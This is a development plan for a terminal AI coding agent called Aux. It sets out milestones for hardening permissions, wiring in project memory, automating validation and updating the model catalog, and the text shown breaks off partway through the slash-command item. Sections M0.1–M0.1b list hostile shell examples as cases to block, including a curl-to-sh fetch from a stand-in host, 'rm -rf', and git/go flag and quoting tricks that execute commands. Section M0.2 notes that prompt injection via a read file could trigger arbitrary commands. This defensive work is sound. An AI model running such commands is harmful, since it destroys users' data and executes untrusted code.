# Aux — Shipping Plan for v0.1.0

**Status:** authoritative execution plan. Written 2026-10-03 from the audit of
`origin/main` at `278b9f1` and the product decisions recorded below.
`TODO.md` is the short status list; this document is the detailed spec each
item in it expands to. When they disagree, this document wins and `TODO.md`
gets corrected.

---

## 0. Read this first (for whoever — or whatever — is executing)

This plan is written to be executed mostly by AI agents with a human reviewing
pull requests. Every work item is self-contained: it says what to change, where,
why, what "done" means, and what not to touch. If you are an agent picking up a
work item:

1. **Read §1 (North star) and §2 (Decisions) in full before touching code.**
   They exist so you do not optimise for the wrong thing. The single most
   common failure mode in this repository's history has been building
   something complete, tested, and never wired in. Do not add to that list.
2. **Do one work item per pull request.** Title the PR with the item ID
   (`M1.4: run validation at task end`). Do not bundle.
3. **Every PR must pass the five CI gates** unchanged: `gofmt -l .` empty,
   `go vet ./...`, `go test -race ./...`, `scripts/deadcode.sh`,
   `scripts/coverage.sh`. If your change makes code unreachable, delete it or
   wire it; do not add it to `.deadcode-baseline` without a comment saying why.
4. **Every "done when" is a test you write or a command you run.** Reading the
   code and concluding it works does not count. This file's predecessor was
   wrong about its own claims ten times; every correction came from running
   something.
5. **Update `TODO.md` in the same PR** — move the item to the closed appendix
   with one line saying what was measured.
6. **Do not widen scope.** If you notice something else broken, add a line to
   `TODO.md` under *Opportunistic* and keep going. If it blocks you, stop and
   say so in the PR.
7. **Stop and ask a human** when: a step requires GitHub settings, secrets, a
   repo rename, publishing, or a product decision not in §2. Those are marked
   **[HUMAN]**.
8. **Verify against a scratch repository, not this one.** `aux -p` with
   `--yes` approves everything. Appendix B has the recipe.

The one-sentence test for any change: *does this make the sentence "Aux
understands how your project works, gives your model only what it needs, and
improves every time you use it" more true, or make the README more honest about
where it is not yet true?* If neither, it is not on this plan.

---

## 1. North star

### 1.1 What Aux is

A local-first terminal coding agent, forked from OpenCode's Go agent loop, whose
differentiator is a **persistent, project-specific intelligence layer** between
the user, the codebase, and one chosen model:

- **Project Brain** — a compiled profile of the project (languages, build/test
  commands, conventions) plus memory (facts, procedures, past episodes), built
  from the repo and from validated work, and **given to the model on every
  turn**.
- **Context OS** — page-level accounting of what is in the prompt, with real
  user controls (exclude, pin) that change what is sent, not just what is shown.
- **Cost Governor** — one efficiency layer for the one model the user chose:
  budgets, trajectory, warnings, a stop before runaway spend.
- **Experience Compiler** — validated commands become procedural memory and
  skill candidates **automatically**, so the tenth similar task costs less than
  the first.

Two surfaces render the same event-backed truth: a Bubble Tea TUI for working,
and a read-only loopback dashboard for understanding.

### 1.2 What Aux is not

- Not a multi-model router. One key, one preferred model.
- Not a hosted service. No telemetry, no account, nothing leaves the machine
  except calls to the configured provider.
- Not "production ready" until a stranger has used it for a week. Say so.
- Not a tool that claims performance numbers it has not measured.

### 1.3 Why the plan is ordered the way it is

The audit found the four systems above are **built but not connected to the
model**. The compiled manifest, memory, and task spec are computed every turn
and discarded before the provider call. The learning loop has no automatic
evidence producer. So the first job after closing a security hole is to make
the thesis mechanically true (M1). Then make Aux pleasant enough to use daily
(M2), so the thesis can be exercised. Then ship (M3). Only then measure (M4),
because measuring the current build measures a product whose brain is off.

---

## 2. Decisions already made

Recorded 2026-10-02/03. Do not relitigate inside a PR; open a discussion if one
seems wrong.

| # | Question | Decision |
| --- | --- | --- |
| D1 | Priority | Project Brain wired into the prompt before UX parity |
| D2 | Audience for 0.1.0 | Public release: tagged, installable, README accurate |
| D3 | Scope of 0.1.0 | **Everything in M0–M3**, including UX parity. Do not tag until it feels like Claude Code |
| D4 | Providers maintained | Anthropic, OpenAI, Gemini, OpenRouter, local/OpenAI-compatible. Groq, Azure, Bedrock, Vertex, Copilot, xAI: unmaintained — keep only if they cost nothing; label them |
| D5 | Default model | Newest suitable model from models.dev for the configured provider, resolved at first run, written to config, announced to the user |
| D6 | Learning loop | Agent runs validation itself at task end; memory and skill candidates accrue with no manual CLI step |
| D7 | When validation runs | Only when the task recorded file mutations (edit/write/patch). Research, review, explain tasks skip it |
| D8 | How validation is approved | Normal permission dialog with "allow for session"; asked once per distinct command |
| D9 | Non-interactive `-p` | Requires an explicit `--yes` flag to auto-approve. Without it, anything that would prompt is denied and reported |
| D10 | Dashboard | On by default. Fix the tokened URL being written into the transcript |
| D11 | Repo name | Rename the GitHub repository to `aux-cli` so module path, docs, install script, and `go install` all agree **[HUMAN]** |
| D12 | Install channels for 0.1.0 | GitHub Releases + `install` script; `go install`; Homebrew tap under `kaiau00/homebrew-tap`. No AUR |
| D13 | Performance claim | Removed from the README until M1 is done and M4 measures it |
| D14 | Attribution | Credit OpenCode plainly in the README's first screen |
| D15 | Executor | Mostly agents, human reviews PRs. Every item has an explicit done-when |

---

## 3. Verified state at `278b9f1` (do not re-audit)

Build, vet, `go test -race ./...` (2m03s), `scripts/coverage.sh` (33.8% vs
floor 30.8%), `scripts/deadcode.sh` (48 entries) all pass. CI is green on
`main`'s own post-merge runs. PR #28 is open, green, and small.

Confirmed good, leave alone unless an item says otherwise: read confinement
(`internal/llm/tools/readaccess.go`), dashboard token handling
(`internal/dashboard/server.go`), `.aux/` self-ignore, panic teardown,
upgrade/downgrade safety, the missing-API-key message, the context meter, the
TUI height invariant.

Confirmed broken, each owned by exactly one item below:

| Finding | Evidence | Item |
| --- | --- | --- |
| Manifest + task spec never sent to the model | `internal/promptcompiler/compiler.go:109-132`, `dedup.go:30-67` mark them `available`; `Messages` = transcript | M1.1, M1.2 |
| Memory renders stable keys, not content | `internal/task/coordinator.go:273-288` | M1.3 |
| No automatic validation evidence; learning loop inert in TUI | `validation.Service.RunIntent` called only from `cmd/validate.go`, `cmd/eval.go` | M1.4 |
| `govpolicy` has no non-test callers | PR #28 description; `rg` confirms | M1.5 |
| Bash safe-list bypassable | `internal/llm/tools/bash.go:46-54, 255-261` | M0.1 |
| Safe-listed commands take mutating arguments (found during M0.1) | `go list -toolexec`, `git log --output`, `git branch -D` measured | M0.1b |
| `-p` auto-approves everything | `internal/app/app.go:430` | M0.2 |
| Model catalog hardcoded, newest Anthropic entry May 2025 | `internal/llm/models/anthropic.go:88`; lookup `agent.go:1182`, `config.go:631` | M2.1 |
| Provider SDKs stale, OpenAI SDK is a beta | `go.mod` | M2.2 |
| Slash input is sent to the model as text | `components/chat/composer.go:73`, `editor.go:122-141` | M2.3 |
| No `--continue` / `--resume` | `cmd/root.go:325-339` | M2.4 |
| `--version` prints `unknown` on local builds | `internal/version/version.go` | M3.5 |
| `.claude/settings.json` committed | `git ls-tree origin/main` | M0.4 |
| Repo is `kaiau00/Aux`, module is `kaiau00/aux-cli` | `git remote -v`, `go.mod` | M0.5 |
| README "How it works" describes behaviour that does not exist | README §How it works step 3 | M1.7, M3.6 |

---

## 4. Architecture map (where things live)

Read the files an item names; this is the orientation.

```
cmd/root.go                      Cobra root: flags, TUI vs -p path, subcommand registration
cmd/{project,profile,task,impact,cost,validate,eval,evalsuite,skill,bundle}.go
internal/app/app.go              Wires every service; builds agent.Deps; starts dashboard
internal/llm/agent/agent.go      The loop: processGeneration → RunTurn → streamAndHandleEvents
                                 Compile() is called at :472; provider.StreamResponse at :497
internal/llm/agent/agent-tool.go Subagents (roles in subtask.go)
internal/llm/agent/tools.go      CoderAgentTools / TaskAgentTools tool lists
internal/llm/provider/*.go       Provider adapters. System prompt is fixed at construction
                                 (provider.go:212 WithSystemMessage); each adapter emits it:
                                 anthropic.go:189, openai.go:71, gemini.go:183/271, copilot.go:191
internal/llm/prompt/             System prompts (coder.go) and context-file injection (prompt.go)
internal/promptcompiler/         Compile(Input) → CompiledPrompt. compiler.go (compat), dedup.go
internal/task/coordinator.go     Begin: profile → task spec → ctx; Finish: checkpoint, learn, skills
internal/task/compiler.go        Task spec compiler (modes in task.go:12-18)
internal/profile/                Scanners → effective profile (Manifest string, ValidationCommands())
internal/memory/                 Store (SaveCandidate, Retrieve, Promote…), Extract, Service
internal/validation/             PlanIntents (plan.go), ShellRunner + Approver (runner.go),
                                 Service.RunIntent / ProofOfDone / SuccessfulCommands (service.go)
internal/skill/, govpolicy/      Evaluation-gated candidates
internal/cost/                   Ledger, Governor (governor.go), Budget (budget.go:45 DefaultBudget)
internal/contextstore/           Pages, versions, bindings (states: resident/available/pinned/evicted/faulted)
internal/permission/             Request/Grant/GrantPersistant/AutoApproveSession; fingerprinted grants
internal/llm/tools/bash.go       Bash tool; banned list :40, safe list :46, check :244-287
internal/llm/tools/readaccess.go Read confinement
internal/config/config.go        viper defaults (:317 setDefaults, :362 setProviderDefaults,
                                 :881 setDefaultModelForAgent, :1091 UpdateAgentModel)
internal/llm/models/             Hardcoded catalogs per provider; catalog.go fetches models.dev
                                 for limits only; local.go discovers LOCAL_ENDPOINT models
internal/tui/tui.go              App model; command registry at :989-1021 (RegisterCommand)
internal/tui/components/chat/    editor.go (composer, send), composer.go (placeholder/hints),
                                 context_pane.go
internal/tui/page/chat.go        SendMsg handling (:89), CommandRunCustomMsg (:94)
internal/dashboard/              HTTP server + assets; viewmodel/ builds the projections
internal/eventstore/             Append-only domain events (types in events.go)
scripts/coverage.sh, deadcode.sh CI gates; .coverage-floor, .deadcode-baseline
.goreleaser.yml, install         Release packaging and the curl|bash installer
```

Correlation flows through `context.Context` keys in `internal/llm/tools`
(`SessionIDContextKey`, `TaskIDContextKey`, `ProjectIDContextKey`,
`TurnIDContextKey`, `ModelCallIDContextKey`, `WorkingDirContextKey`,
`ParentTaskIDContextKey`). The coordinator attaches project manifest and task
spec via `promptcompiler.WithProjectContext(ctx, …)`; the agent reads them back
with `ProjectContextFromContext(ctx)` at `agent.go:466`.

---

## 5. Milestones and dependency order

```
M0 Trust & hygiene ──────────────┐
                                 ├──► M1 Project Brain wired ──► M1.7 README "How it works"
M2.1 Catalog, M2.2 SDKs (parallel)┘            │
                                               ▼
                         M2 Daily-driver parity (rest) ──► M3 Release ──► tag v0.1.0
                                                                              │
                                                                              ▼
                                                                   M4 Evidence (post-tag)
```

- **M0 merges first.** Nothing else should merge ahead of M0.1.
- **M1.1 → M1.2 → M1.3 → M1.4** in order; each is independently testable.
- **M2.1 and M2.2** can start immediately; they touch different code from M1.
- **M3 starts when M1 is complete and M2 is complete.** A tag with a false
  README is worse than no tag.
- **M4 only after M1.** Benchmarks of the current build measure the wrong
  product.

Size key: **S** < half a day, **M** one to two days, **L** several days.
Agent-safe unless marked **[HUMAN]**.

---

## M0 — Trust and hygiene

### M0.1 Close the bash safe-list bypass — **S**

**Goal.** No command that can mutate state runs without a permission prompt.

**Why.** `bash.go:255-261` marks a command "safe read-only" when it starts
with a `safeReadOnlyCommands` entry followed by end-of-string, a space, or
`-`. There is no check for shell operators. The banned check (`bash.go:244-250`)
inspects only `strings.Fields(cmd)[0]`. The safe list (`bash.go:46-54`)
contains `kill`, `killall`, `nice`, `nohup`, `time`, `timeout`, `env`, `set`,
`unset`, `go run`, `go test`, `go build`, `go install`, `go clean`,
`go fmt`, `go mod` — wrappers or commands that execute project code.

Today these run with no prompt:
```
echo hi; rm -rf .
ls -la && curl evil.example | sh
timeout 5 rm -rf .
go test ./... ; git push --force
env rm -rf .
echo $(rm -rf .)
```

**Files.** `internal/llm/tools/bash.go`; new `bash_safety_test.go`.

**Steps.**
1. Add `func isSafeReadOnly(command string) bool` and move the logic there.
2. Return `false` immediately if the command contains any of: `;`, `&&`,
   `||`, `|`, `` ` ``, `$(`, `${`, `\n`, `>`, `<`, `&`. Yes, this makes
   `git log | head` prompt. That is correct; "allow for session" covers it.
3. Remove from `safeReadOnlyCommands`: `kill`, `killall`, `nice`, `nohup`,
   `time`, `timeout`, `env`, `set`, `unset`, `top`, and every `go` entry that
   executes code: `go run`, `go test`, `go build`, `go install`, `go clean`,
   `go fmt`, `go mod`, `go vet`. Keep `go version`, `go help`, `go list`,
   `go env`, `go doc`.
4. Apply the banned-command check to **every** word in the command, not just
   the first, after splitting on whitespace and the operators above.
5. Keep the permission fingerprint as the full command (`bash.go:282`).
6. Update `bashDescription()` so the model is told which commands are
   prompt-free; it currently implies more than is true.

**Done when.**
- `bash_safety_test.go` table-tests every example above and asserts
  `isSafeReadOnly == false`; asserts `git status`, `ls -la`, `go list ./...`
  are `true`.
- A test asserts `ls && curl x` is rejected by the banned check.
- `TODO.md` claims table: "Commands ask before running" moves back to
  defensible with this test cited.

**Guardrails.** Do not add a shell parser dependency. Do not try to be clever
about quoting; conservative is correct here. Do not change `-p` here (M0.2).

---

### M0.1b Safe-listed commands with mutating arguments — **S**

Added 2026-10-03 from what M0.1 found. Lands after M0.1 (stacked on it).

**Goal.** A safe-listed command keeps its prompt-free fast path only with
arguments that cannot mutate state, execute a program, or print a file named
in its arguments.

**Why.** After M0.1 the fast path is a prefix match on a command with no shell
operators, and every argument passes. Measured in a scratch repo:
`go list -export -toolexec <prog> .` ran `<prog>`; `git log --output=<file>`
wrote the file; `git branch -D <b>` deleted the branch;
`git ls-remote --upload-pack='<cmd>' .` ran `<cmd>`. Quoting disguises a flag
from a word check: `'--output=x'`, `--out\put=x`, `{--output=x,}` and
`$'\x2d-output=x'` each wrote the file. By reading, not run: `git tag -d`,
`git remote add/remove/set-url`, `git grep -O<cmd>`, `go env -w`,
`hostname <name>`, `date -s`, `git diff --no-index <outside-file>`,
`git blame --contents <file>`, `git config --file <file>`.

**Files.** `internal/llm/tools/bash.go`, `bash_safety_test.go`.

**Steps.**
1. Refuse the fast path when the command contains `'`, `"`, `\`, `{`, `}`, or
   `$`. These are how a flag is disguised; refusing them keeps the argument
   check a plain whitespace split.
2. Give each safe-list entry an optional argument rule, checked against the
   words after the prefix:
   - every `git` entry: no long option that is a prefix of `output`,
     `upload-pack`, `exec`, `no-index`, `ext-diff`, `open-files-in-pager`,
     `contents`, `file` (so abbreviations are caught); no short-option cluster
     containing `O` or `f`.
   - `git branch`, `git tag`: listing flags only, no positional arguments.
   - `git remote`: bare, `-v`, or `show` / `get-url`.
   - `go list`, `go env`: only listed flags (`go list`: `-json -f -m -e
     -deps -find -test -versions -u -retracted`; `go env`: `-json -changed`),
     with `-x` and `--x` treated alike.
   - `date`: only `+format` and the UTC / ISO / RFC display flags.
   - `hostname`: bare or display flags only.
3. Tell the model in `bashDescription()` that quotes, backslashes, braces,
   and `$` also mean a prompt.

**Done when.** `bash_safety_test.go` rejects every example above and accepts
`git branch`, `git branch -a`, `git tag`, `git remote -v`,
`git log --oneline -5`, `git config --get user.name`, `go list ./...`,
`go list -m all`, `go env GOPATH`, `date +%s`, `hostname`.

**Guardrails.** Same as M0.1: no shell parser, prompt when in doubt. A false
positive costs one prompt with "allow for session"; a false negative runs
unprompted.

---

### M0.2 `-p` requires `--yes` to auto-approve — **S**

**Goal.** Non-interactive mode cannot execute anything a user would have been
prompted for unless the user explicitly asked for that.

**Why.** `app.go:430` calls `Permissions.AutoApproveSession(sess.ID)`
unconditionally in `RunNonInteractive`. Combined with prompt injection via a
file the agent reads, `aux -p "summarise this repo"` can run arbitrary
commands. Decision D9.

**Files.** `cmd/root.go`, `internal/app/app.go`, `internal/permission/permission.go`.

**Steps.**
1. Add `--yes` (bool) to the root command. Help text: *"Approve every
   permission request in non-interactive mode. Without it, actions that would
   prompt are denied and listed."* Also accept `--dangerously-skip-permissions`
   as a hidden alias for people arriving from Claude Code.
2. In `RunNonInteractive`, call `AutoApproveSession` only when `--yes` is set.
3. Otherwise install a denying approver for the session: `Request` returns
   `false` without blocking, and records `{tool, action, path, fingerprint}`
   to a per-session list. The permission service already has `pendingRequests`;
   add a `DenyAllSession(sessionID)` mode alongside `autoApproveSessions`.
4. At the end of a `-p` run, if anything was denied, print to **stderr**:
   `N action(s) were denied because --yes was not given:` followed by one line
   each. Exit code stays 0 if the model completed; the denials are information.
5. Mention `--yes` in the `-p` flag help and in `docs/trying-aux.md`.

**Done when.**
- A test in `internal/app` runs `RunNonInteractive` with a fake agent that
  requests a bash permission and asserts denial without `--yes`, approval with.
- `aux -p "run ls" ` in a scratch repo prints the denial line; with `--yes` it
  runs.

**Guardrails.** `aux validate --yes` already exists with the same semantics;
keep them consistent. Do not make denial a fatal error — the model may still
produce a useful read-only answer.

---

### M0.3 Merge PR #28 and raise the coverage floor — **S**

**Goal.** Skill promotion is reachable from the CLI; the coverage ratchet
captures the gain.

**Steps.**
1. **[HUMAN]** Merge [PR #28](https://github.com/kaiau00/aux-cli/pull/28).
2. Set `.coverage-floor` to the value `scripts/coverage.sh` reports on CI after
   the merge (expected ~33.8). Open as its own PR so the floor change is
   visible in history.

**Done when.** `main` is green with the new floor.

---

### M0.4 Repository hygiene — **S**

**Steps.**
1. `git rm .claude/settings.json`; add `.claude/` to `.gitignore`. It is a
   Claude Code bash allowlist from development and should never have shipped.
2. Add `.codebase-memory/` and `.kilo/` to `.gitignore`.
3. Remove `aux-panic-subscription-sessions-*.log` pattern concerns: `*.log` is
   already ignored; confirm no `.log` is tracked.

**Done when.** `git ls-tree -r HEAD --name-only | rg '^\.claude|codebase-memory|\.kilo'`
is empty.

---

### M0.5 Make the repository name match the module — **S [HUMAN]**

**Why.** Remote is `github.com/kaiau00/Aux`; `go.mod`, README, `install`, and
`.goreleaser.yml` say `github.com/kaiau00/aux-cli`. `gh` follows GitHub's
redirect; `go install` and the raw `releases/latest/download/…` URL may not.
Decision D11: rename the repo.

**Steps.**
1. **[HUMAN]** GitHub → Settings → rename `Aux` to `aux-cli`.
2. `git remote set-url origin https://github.com/kaiau00/aux-cli.git` locally.
3. Verify: `curl -sI https://github.com/kaiau00/aux-cli` returns 200;
   `go list -m github.com/kaiau00/aux-cli@main` resolves (after M3.1 tags, use
   the tag).

**Done when.** Every URL in the tree resolves without a redirect.

---

## M1 — Make the Project Brain real

### M1.1 Per-call system addendum plumbing — **M**

**Goal.** The agent can attach task-specific system text to a single provider
call without rebuilding the provider, and the compiled prompt accounts for it.

**Why.** `provider.WithSystemMessage` (`provider.go:212`) fixes the system
prompt at construction. The manifest is per project (stable within a session)
and the task spec is per task; neither can go through a construction-time
option. There is no per-call parameter on `Provider.StreamResponse`.

**Design.** Add a `SystemAddendum` carried on `context.Context`, set by the
agent right before `StreamResponse`, read by each adapter when it emits the
system block. The addendum is appended **after** the base system prompt, so
the base prompt remains the provider-cacheable stable prefix. Within the
addendum, the order is: project manifest (changes rarely) → memory section
(changes per task) → task spec (changes per task).

**Files.**
- `internal/llm/provider/provider.go`: `type SystemAddendumContextKey`,
  `WithSystemAddendum(ctx, string)`, `SystemAddendumFromContext(ctx)`.
- `internal/llm/provider/anthropic.go:189`, `openai.go:71`,
  `gemini.go:183 and :271`, `copilot.go:191`: emit
  `systemMessage + "\n\n" + addendum` when addendum is non-empty. Azure and
  Bedrock inherit from openai/anthropic clients and need no change; verify.
- `internal/promptcompiler/compiler.go`: add `SystemAddendum string` to
  `CompiledPrompt`; both compilers set it from `in.ProjectManifest` and
  `in.TaskSpecText` (rendered with fixed headings `# Project` and `# Task`).
  Count it in `EstimatedTokens`.
- `internal/llm/agent/agent.go:497`: `ctx = provider.WithSystemAddendum(ctx,
  compiled.SystemAddendum)` before `StreamResponse`.

**Done when.**
- `provider_test.go` (or the mock provider) asserts the addendum reaches the
  outgoing request for anthropic and openai adapters.
- `compiler_test.go` asserts `SystemAddendum` contains both inputs in the fixed
  order and `EstimatedTokens` grew by their estimate.
- Determinism test: two compiles with identical inputs produce byte-identical
  `SystemAddendum`.

**Guardrails.** Do not move the base system prompt. Do not put the addendum
*before* it — that would break the cache prefix the whole project has been
protecting (see `processContextPaths` comment in `prompt.go`).

---

### M1.2 Mark manifest and task-spec pages resident — **S**

**Goal.** The context store, dashboard, and TUI say the manifest is in the
prompt because it is.

**Files.** `internal/promptcompiler/compiler.go:138-174` (`decomposePages`),
`internal/llm/agent/agent.go:717-753` (`bindPages`), golden tests under
`internal/tui/visual/testdata` if the context pane output changes.

**Steps.**
1. In `decomposePages`, set `State: "resident"`, `Reason: "project knowledge"`
   / `"compiled task spec"` for the two pages.
2. Remove the comment at `compiler.go:5-9` describing "later phases" — this is
   that phase.
3. Confirm `ContextCompiled.ResidentPages` increments accordingly.

**Done when.** `compiler_test.go` asserts both pages are resident; a scratch
session's `ContextCompiled` event payload shows them (query
`SELECT payload FROM events WHERE type='context.compiled' ORDER BY seq DESC LIMIT 1`).

---

### M1.3 Render memory content, bounded by tokens — **M**

**Goal.** The memory section carries information the model can use.

**Why.** `coordinator.memorySection` (`coordinator.go:273-288`) renders
`[episodic] episode:<task-id>`. The content lives in `memory.Version.ContentJSON`
and is never read on this path.

**Files.** `internal/memory/store.go` (add `LatestVersion(ctx, memoryID)` —
there is a `Version` type and a versions table; `Retrieve` returns only
`Memory`), `internal/memory/service.go` (expose it), `internal/task/coordinator.go`.

**Steps.**
1. `Store.LatestVersion(ctx, memoryID) (Version, bool, error)`.
2. `Service.RetrieveWithContent(ctx, projectID, types, limit) ([]MemoryWithContent, error)`.
3. In `memorySection`, render one line per memory by type:
   - factual: the `fact` field.
   - procedural: `` `command` `` — *validated <N> times, last at <revision>*.
   - episodic: *<objective> → <outcome>* (and `changedPaths` if ≤ 3).
4. Bound the section by a token budget (default 600 tokens, estimated at
   4 chars/token like `estimateText`), newest first, not by count.
5. Pull only `StateActive` memories; `Retrieve` already does — verify.

**Done when.** `coordinator_test.go` seeds one memory of each type and asserts
the rendered section contains the content fields and no stable keys; a test
with 50 memories asserts the section respects the budget.

---

### M1.4 Run validation at task end, automatically — **L**

**Goal.** A task that changed files ends with its project's validation commands
having been run (with permission), evidence recorded, and memory/skills
extracted from what passed. No CLI step.

**Why.** `validation.Service.RunIntent` is reached only from `cmd/validate.go`
and `cmd/eval.go`. `coordinator.Finish` → `learnFromTask` reads
`SuccessfulCommands(taskID)`, which is always empty after a TUI session, so
procedural memory and skill candidates never appear. Decisions D6, D7, D8.

**Where it runs.** In `agent.processGeneration` after the loop returns a final
assistant message and **before** the deferred `coordinator.Finish` fires — the
agent has the permission service and session context; the coordinator does
not. Implement as `agent.validateTaskIfNeeded(ctx, sessionID, taskID)`.

**Files.** `internal/llm/agent/agent.go` (new method, called at the end of
`processGeneration`), `internal/llm/agent/validate.go` (new),
`internal/validation/runner.go` (an `Approver` adapter over
`permission.Service`), `internal/task/coordinator.go` (expose profile
validation commands and acceptance criteria for a task — `cmd/validate.go:77-90`
shows exactly what to call), `internal/config/config.go` (`validation.auto`
default `true`), `internal/eventstore/events.go` (if a
`validation.skipped` type does not exist, add one with a reason).

**Steps.**
1. **Decide whether to run.** Skip, emitting `validation.skipped{reason}`,
   when any of: config `validation.auto=false`; the task has no acceptance
   criteria; the effective profile has no validation commands; **the session
   recorded no file mutations** (check `History.ListBySession(sessionID)` for
   versions created during this task — D7). Research/review/explain tasks fall
   out of this naturally because they do not write files; do not gate on
   `task.Mode` alone.
2. **Plan.** `validation.PlanIntents(eff.ValidationCommands(), criterionIDs)`
   exactly as `cmd/validate.go` does.
3. **Approve.** Build a `validation.Approver` that calls
   `permissions.Request` with `ToolName: "validation"`, `Action: "execute"`,
   `Path: workdir`, `Fingerprint: command`, `Description: "Run validation:
   <command>"`. The TUI's permission dialog already offers "allow for session"
   — that gives D8 for free.
4. **Run.** `validation.ShellRunner` with the approver; for each intent call
   `Service.RunIntent(ctx, taskID, intent, inputFingerprint, runner)`.
   Honour the impact graph's broaden/targeted decision if `Impact` is wired
   (`agent.CoderAgentTools` already receives `app.Impact`); otherwise run all.
5. **Report.** Append a short system-visible note to the transcript (as the
   `aux validate` CLI prints): per criterion, Validated / Failed / Denied.
   Emit the existing `validation.*` events.
6. **Then** the deferred `Finish` runs `learnFromTask` → `SuccessfulCommands`
   now returns real commands → procedural memory and skill candidates are
   created by code that already exists.
7. A denied command is recorded as denied, never as failed.

**Done when.**
- `validate_test.go` with a fake runner: task with file mutations + profile
  commands → `RunIntent` called once per intent, evidence recorded,
  `SuccessfulCommands` non-empty, one procedural memory and one skill candidate
  exist afterwards.
- Same test with no mutations → `validation.skipped{reason: "no file changes"}`
  and no runner calls.
- Same test with approver returning false → recorded as denied, no memory.
- Scratch repo end-to-end (Appendix B): a task that edits `main.go` ends with
  `aux skill list` showing one candidate and `aux task show <id>` showing
  criteria Validated.

**Guardrails.** Never auto-approve. Never run validation on a task with no
mutations even if the model asked for it in text. Do not run inside subagent
sessions (`ParentTaskIDContextKey` set) — the parent validates. Keep the whole
thing best-effort: a validation failure is information for the user, not an
error that fails the turn.

---

### M1.5 `govpolicy`: wire it or delete it — **M**

**Why.** `Policies.Evaluate` / `Promote` have no non-test callers. The governor
uses `cost.DefaultBudget(ModeBalanced)` (`agent.go:895`); learned policies
never influence it. The dashboard shows a "governed-cost policies" panel for
a table that cannot fill.

**Decision for this plan: delete**, unless wiring is trivial. Wiring is not
trivial — it needs a producer (what makes a policy candidate?) and an evaluator
(what makes it pass?). Neither exists and nothing in the thesis needs them for
0.1.0. Learned budgets can return in 0.2 with evidence.

**Steps.**
1. Remove `internal/govpolicy`, its migration-free tables are fine to leave
   (migrations only add; document the orphan table in ADR 0003's spirit with a
   one-line note), the dashboard "policies" section, `bundle` export of
   policies (keep skills), and `cmd/bundle.go` references.
2. Update `.deadcode-baseline` by *removing* entries, never adding.
3. Keep `cost.Governor` and its `observe`/`on` modes; they work.

**Done when.** `rg govpolicy` returns nothing outside git history; dashboard
renders without the panel; gates pass with a shorter baseline.

---

### M1.6 Context states say what exists — **S**

**Why.** `contextstore` defines `evicted` and `faulted`; nothing writes them.
The dashboard and expanded context view group by them.

**Steps.** Remove the two states and their UI groups. Reintroduce with M4.3
if eviction ships. Update ADR 0006 with a dated note.

**Done when.** `rg 'StateEvicted|StateFaulted'` is empty.

---

### M1.7 README "How it works" tells the truth — **S**

Lands in the **same PR as M1.4**. Rewrite README §How it works steps 3–6 to
describe: system addendum (manifest, memory, task spec) on every call; the
exclude/pin controls; validation at task end gated on file changes and
permission; memory/skill extraction from validated commands. Remove "demand
paging" language; describe `--paging` as *dedup of repeated tool output,
off by default*. Remove the tagline's performance claim (D13).

**Done when.** A reviewer can map every sentence in the section to a code
path landed in M1.

---

## M2 — Daily-driver parity

### M2.1 Model catalog: any model ID, current defaults — **L**

**Goal.** A user can type any current model ID for a maintained provider; a
new user gets a current model without editing anything.

**Why.** `models.SupportedModels` is a hardcoded map (`models.go:50-97`). The
agent (`agent.go:1182`) and config validation (`config.go:631`) refuse any ID
not in it. The newest Anthropic entry is `claude-sonnet-4-20250514`. The
catalog fetcher (`catalog.go`) already downloads models.dev's `api.json` but
uses it only for context limits. Decision D4, D5.

**Design.**
- Treat models.dev as the source of truth for the five maintained providers:
  model id, display name, context/output limits, costs (input, output,
  cache read, cache write), `tool_call`, `reasoning`, `release_date`. Verify
  the exact field names against a fresh `api.json` before coding; `catalog.go`
  already parses `limit`.
- Build `models.Model` entries dynamically from it; keep the hardcoded tables
  as an **offline fallback** and for unmaintained providers.
- Cache `api.json` at `$XDG_CACHE_HOME/aux/models.json` (fallback
  `~/.cache/aux/`), TTL 24h, refresh in the background; never block startup on
  the network for more than ~2s.
- `agents.<name>.model` accepts either a known ID or `<provider>/<api-model-id>`
  (e.g. `anthropic/<id>`). Resolution: hardcoded map → catalog → error that
  lists the provider's catalog IDs.
- **Default model (D5):** when no `agents.coder.model` is configured, pick
  for the configured provider the model with the newest `release_date` that has
  `tool_call: true`, is not marked preview/beta/experimental in its id or
  name, and has the largest context among ties. Write the choice to
  `~/.aux.json` and print one line at startup: `Using <name> (newest for
  <provider>). Change with Ctrl+O or agents.coder.model.` Do not re-pick on
  later runs; the user's config now holds it.
- `title` and `summarizer` agents default to the cheapest model from the same
  provider that has `tool_call` (title) — or the same model if there is only one.

**Files.** `internal/llm/models/catalog.go`, `models.go`, a new
`catalog_models.go`; `internal/config/config.go:362-460, 626-660, 881-930,
1091-1110`; `internal/tui/components/dialog/models.go` (the picker must list
catalog models); `aux-schema.json`.

**Steps.**
1. Extend the catalog parser to the full entry; add
   `CatalogModels(provider) []Model`.
2. `models.Resolve(id string) (Model, bool)` used by the three lookup sites.
3. Default-model selection in `setProviderDefaults` per the rule above.
4. Model dialog lists catalog models grouped by provider, newest first.
5. Mark Groq/Azure/Bedrock/Vertex/Copilot/xAI as "unmaintained" in the picker
   and README (D4). Do not delete them in this item.

**Done when.**
- `catalog_test.go` with a fixture `api.json`: resolves an ID not in the
  hardcoded table; picks the expected default; falls back offline.
- `config_test.go`: `agents.coder.model: anthropic/<fixture-id>` validates.
- Manual: with only `ANTHROPIC_API_KEY` set and no config, `aux` starts, prints
  the "Using …" line, and `~/.aux.json` gains the model.

**Guardrails.** Costs from the catalog feed the ledger; if a catalog entry has
no cost, record `CostState: unknown` (the ledger already has the concept) —
never guess a price.

---

### M2.2 Bump provider SDKs — **M**

`go.mod` pins `openai-go v0.1.0-beta.2` (→ 1.x), `anthropic-sdk-go v1.4.0`
(→ 1.7x), `mcp-go v0.17.0` (→ 1.x), `google.golang.org/genai v1.3.0` (→ 1.7x).

**Steps.** One PR per SDK. `go get <mod>@latest`, fix compile errors in the
adapter, run the suite. The suite is offline; the adapter tests
(`provider_test.go`, `usage_test.go`) guard the usage-accounting regression
that bit this project before (`prompt_tokens_details`). Add a streaming test
with a recorded fixture per provider if one does not exist.

**Done when.** Four PRs merged, suite green, a manual one-turn session per
maintained provider shows correct token counts in the status bar.

---

### M2.3 Slash commands — **M**

**Goal.** `/init`, `/compact`, `/exclude <path>`, `/remember <text>` (M2.6),
`/model`, `/help`, `/sessions`, and every custom command (`/user:foo`,
`/project:bar`) run from the composer.

**Why.** `isSlashCommand` (`composer.go:73`) only swaps the placeholder to
"Run a command…". `editorCmp.send` (`editor.go:122-141`) forwards the text to
the model. `/init` is sent to the model as the string `/init`.

**Files.** `internal/tui/components/chat/editor.go`, `composer.go`,
